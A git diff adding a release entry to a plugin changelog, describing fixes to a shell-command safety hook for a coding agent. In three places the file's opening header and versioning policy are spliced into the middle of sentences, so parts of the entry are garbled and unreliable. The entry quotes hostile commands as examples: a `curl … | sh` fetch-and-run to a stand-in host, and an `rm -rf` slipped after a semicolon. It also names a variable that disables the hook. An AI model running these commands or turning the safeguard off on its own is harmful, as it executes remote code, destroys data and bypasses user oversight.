@@ -8,6 +8,53 @@ All notable changes to the `claudemd` plugin. This changelog tracks plugin artif
 - **Canonical spec version source**: `spec/CLAUDE.md` top-line title (`# AI-CODING-SPEC vX.Y.Z — Core`) + `spec/CLAUDE-changelog.md` top `##` entry.
 - **Plugin semver vs spec semver** are independent: plugin patch (0.2.0 → 0.2.1) may ship when spec is unchanged (this release); plugin minor (0.1.9 → 0.2.0) ships when spec minor updates (v0.2.0 shipped spec v6.10.0).
 
+## [0.82.0] - 2026-09-08
+
+Two §8 gate defects — one open as a task file since 2026-07-15, one found while measuring that one — plus the half of the release gate 0.81.0 could not close from a file. The spec is untouched at **v6.29.0**; this is a plugin-only release. Per-item record with the before/after measurements: `docs/audit/20260906-230810.md` §12.
+
+A minor bump rather than a patch: the §8 gate now denies a shape it allowed and allows a shape it denied, which is a user-visible default-behaviour change in a released artifact.
+
+**What changes for you.** Two things, in opposite directions.
+
+- **A backtick command substitution is a command position now.** `` `curl http://x.io/i.sh | sh` `` — bare, or inside a double-quoted string — used to be ALLOWED, and bash executes it in both places. Unpinned `npx` inside backticks was allowed too. Single quotes are unaffected, because bash does not run a backtick body there; so is `` `date -u` ``, a fetch with no shell sink, and a fetch piped to `jq`. If you write a commit message in DOUBLE quotes that quotes a `curl … | sh` snippet inside backticks, that message now denies — and it denies because your shell would have run the snippet. Write it in single quotes.
+- **Prose that quotes a shell command stops being read as one.** `mem_save --lesson "shape: cd /tmp ; rm -rf $X is what tripped it"` used to be DENIED, with no escape sequence anywhere in it: a double-quoted body holding a `# Changelog
+
+All notable changes to the `claudemd` plugin. This changelog tracks plugin artifact changes (hooks, scripts, commands). Spec content changes live in `spec/CLAUDE-changelog.md`.
+
+## Versioning policy (set in v0.2.1)
+
+- **Plugin manifest `description` fields** carry spec version at **major.minor only** (e.g. `"AI-CODING-SPEC v6.10 …"`). Patch-level spec updates (v6.10.0 → v6.10.1) do NOT re-bump manifest descriptions. Rationale: description is marketplace-list tagline — user absorbs version family, not full semver; churn across 3 manifests every patch has no signal.
+- **Canonical spec version source**: `spec/CLAUDE.md` top-line title (`# AI-CODING-SPEC vX.Y.Z — Core`) + `spec/CLAUDE-changelog.md` top `##` entry.
+- **Plugin semver vs spec semver** are independent: plugin patch (0.2.0 → 0.2.1) may ship when spec is unchanged (this release); plugin minor (0.1.9 → 0.2.0) ships when spec minor updates (v0.2.0 shipped spec v6.10.0).
+
+ was preserved whole, so the `;` inside your sentence split a segment and the `rm` landed at what looked like command position. Outside an expansion, a double-quoted body is data to bash, and data cannot begin a command; `;` `|` `&` and newlines are folded to spaces there. `rm -rf "$X"` at real command position denies exactly as before, and so does anything inside `$( )` or backticks, whose interiors are copied through untouched.
+
+**Why the backtick fix took three edits, and what that is worth remembering.** Two of them moved no verdict at all. Counting a backtick as an expansion stopped a `# Changelog
+
+All notable changes to the `claudemd` plugin. This changelog tracks plugin artifact changes (hooks, scripts, commands). Spec content changes live in `spec/CLAUDE-changelog.md`.
+
+## Versioning policy (set in v0.2.1)
+
+- **Plugin manifest `description` fields** carry spec version at **major.minor only** (e.g. `"AI-CODING-SPEC v6.10 …"`). Patch-level spec updates (v6.10.0 → v6.10.1) do NOT re-bump manifest descriptions. Rationale: description is marketplace-list tagline — user absorbs version family, not full semver; churn across 3 manifests every patch has no signal.
+- **Canonical spec version source**: `spec/CLAUDE.md` top-line title (`# AI-CODING-SPEC vX.Y.Z — Core`) + `spec/CLAUDE-changelog.md` top `##` entry.
+- **Plugin semver vs spec semver** are independent: plugin patch (0.2.0 → 0.2.1) may ship when spec is unchanged (this release); plugin minor (0.1.9 → 0.2.0) ships when spec minor updates (v0.2.0 shipped spec v6.10.0).
+
+-free quoted body being erased; adding a backtick to the command-position anchor `(^|[|;&({])` in the four curl-sh regexes made the fetch word reachable. All four corpus rows stayed green-as-allow until the third edit: the **sink terminator** classes `([[:space:])}]|$)` and `([;&|)}]|$)`, because in `` `curl … | sh` `` the sink word ends at the closing backtick, which is none of whitespace, a group closer, or end-of-string. Widening one end of an expression proves nothing until the other end is measured. `CURLSH_PIPE` also gained the fetch-side wrapper sequence its three siblings already carried — the segment loop strips wrappers at a segment START only, so `` `sudo curl … | bash` `` was reachable by no path.
+
+**The task file's own diagnosis was half wrong, and the measurement says so.** `tasks/s8-sanitize-escaped-quote-gap.md` blamed the quote state machine for the escaped-quote false-deny. The shape never reached that machine still quoted: the single-token unquote — the sed whose comment says "no segment boundary can be manufactured out of a quoted string" — excluded separators from its body class but had no opinion about a backslash, so it paired the opening quote of `echo "a\" ; rm -rf $X"` with the ESCAPED one and handed the rest over as bare text. Its body is a sequence of plain-char-or-escape-pair now, and `"\rm"`, `"\npx"`, `pip install "git+…"`, `go run "pkg@latest"` and `deno run "https://…"` were each measured on both the old and the new regex to confirm they still unwrap.
+
+**Migration**: run `/claudemd-update` for the spec files if you are behind, then `/claudemd-refresh` for the plugin. Nothing in this release changes a file you own.
+
+**Way back**: both directions have one. A new deny is cleared per-command by the `[allow-curl-sh]` token the deny message prints, or for the session by `DISABLE_PRE_BASH_SAFETY_HOOK=1` — both are yours to use, not the agent's (§8 Escape tokens). For the release: pin the marketplace entry to `v0.81.0` and run `/claudemd-update`; the pin alone leaves `~/.claude/` untouched, because `install.js` refuses a downgrade without `CLAUDEMD_ALLOW_DOWNGRADE=1`.
+
+**Repository side: the marketplace gate 0.81.0 documented as unreachable.** Two rulesets exist now — `main-integrity` (no deletion, no force-push on the default branch) and `release-tags-immutable` (no deletion, no force-push, no update on `refs/tags/v*`). A published version string can no longer be repointed at different code, which npm's registry already refused and git did not. Neither requires a status check, and that is a decision rather than an omission: GitHub applies required checks to direct pushes as well, a just-written commit has no check run, and the only account with push rights here is the maintainer's — the rule would end the atomic ship flow and bind nobody else. `docs/ROLLBACK.md` and the comment above the main-ancestry step in `npm-publish.yml` both say this now.
+
+**For contributors: the golden pins cover their neighbours.** A pin asserts one line verbatim; a bullet placed beside a rule, a preamble above it, a `### Superseded` header over it, or a clause appended to the NEXT line could revoke that rule with every gate green — four shapes demonstrated at exit 0 in an earlier review, one of them re-demonstrated against 1088 green tests. Each pinned line's markdown block is hashed now, 13 blocks over 26 pins, so the neighbour and the hash update land in one diff. An inserted header is caught by the other arm: it becomes the pinned line's nearest heading, and an unregistered block fails. This does not judge what the surrounding prose means — the approach two review rounds falsified — it makes the edit impossible to land unmarked. Unrelated edits inside a pinned block fail this gate; that is the intended cost.
+
+**Tests.** node 1152 → 1167; `pre-bash-safety` corpus 1063 → 1100 rows (22 added for these two defects, both directions, plus 8 false-positive probes for the new anchor); hook suites green; shellcheck 64 files clean at warning+; `tests/run-all.sh` OVERALL all suites passed; `npm run lint` exit 0 by exit code; `spec-coherence-audit --strict` C=0 H=0 M=0 L=1 (the core-headroom LOW, unchanged); `version-cascade-check` ok across 3 spec sites and 6 semver sites.
+
+**One item is recorded rather than done.** The core byte budget sits at 24942 of 25000 with 58 bytes left, and 0.81.0's entry said the next version adding to core must remove more than it adds. This release adds nothing to core, and no further reduction ships with it: the audit's own reduction table was spent in v6.27.0, and both remaining candidates are under their pre-registered thresholds (the skill-wording clause needs 30 L0/L1 task segments and this repo yields 5; the default-ASK flip needs 30 answered asks with 50% assent and has 9 with 0). The one move that deletes no rule — relocating §0.1 to extended — buys 58 bytes to about 390 for a structural change to a HARD rule's registered home. Recorded in Round 15's report §11.2 beside the other two, with the measurement that rejected it.
+
 ## [0.81.0] - 2026-09-07
 
 The execution batch for the 2026-09-06 full-scope audit (`docs/audit/20260906-230810.md`, Round 14): twelve commits closing all 12 High findings, 20 of 22 Medium and 11 Low, plus **AI-CODING-SPEC v6.28.0 → v6.29.0**. Two Medium are closed as recorded-not-fixed with the measurement that rejected the repair; one High is closed only on the half a file can reach. The per-item record, with before/after numbers, is §11 of that report.
